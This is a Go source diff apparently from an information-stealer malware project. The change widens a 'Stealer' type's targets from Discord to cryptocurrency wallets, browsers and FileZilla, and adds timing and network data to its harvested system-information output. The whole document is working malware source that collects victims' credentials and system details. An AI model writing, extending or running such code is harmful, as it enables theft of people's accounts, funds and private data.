@@ -7,6 +7,7 @@ package main
 
 import (
 	"os"
+	"time"
 	"os/exec"
 	"os/user"
 	"strings"
@@ -14,7 +15,9 @@ import (
 
 type Apps struct {
 	Discord Discord
-	Wallets Wallets
+	Wallets []Wallet
+	Browsers []Browser
+	FileZilla FileZilla
 }
 
 type OS struct {
@@ -30,7 +33,9 @@ type OS struct {
 }
 
 func (stealer *Stealer) WriteSystemJson() {
-	// Write system related information structs as json objects to the Output directory in the System folder
+	defer TimeTrack(time.Now())
+
+	// Write system related information structs as json objects to the Output directory
 	var systemOutputPath = CleanPath(outputPath + "\\System\\")
 	if os.Mkdir(systemOutputPath, 0666) != nil {
 		return
@@ -40,16 +45,14 @@ func (stealer *Stealer) WriteSystemJson() {
 	osFile.WriteJson(stealer.OS)
 	osFile.Move(systemOutputPath)
 
+	netFile := File{Path: CleanPath(systemOutputPath + "\\" + "network.json")}
+	netFile.WriteJson(stealer.Network)
+	netFile.Move(systemOutputPath)
+
 	if len(stealer.Memory.InstalledSoftware) > 0 {
 		softwareFile := File{Path: CleanPath(systemOutputPath + "\\" + "software.json")}
 		softwareFile.WriteJson(stealer.Memory.InstalledSoftware)
 		softwareFile.Move(systemOutputPath)
-	}
-
-	if len(stealer.Network.NetworkConnections) > 0 {
-		networkFile := File{Path: CleanPath(systemOutputPath + "\\" + "connections.json")}
-		networkFile.WriteJson(stealer.Network.NetworkConnections)
-		networkFile.Move(systemOutputPath)
 	}
 
 	if getScrapedFiles {
@@ -60,8 +63,10 @@ func (stealer *Stealer) WriteSystemJson() {
 }
 
 func (stealer *Stealer) GetSystemInfo() {
+	defer TimeTrack(time.Now())
+
 	// Get and parse system related information from systeminfo command output
-	out, err := exec.Command("systeminfo").Output() // I will implement a more efficient method
+	out, err := exec.Command("systeminfo").Output() // Will change to registry scrape in another version
 	if err != nil {
 		return
 	}
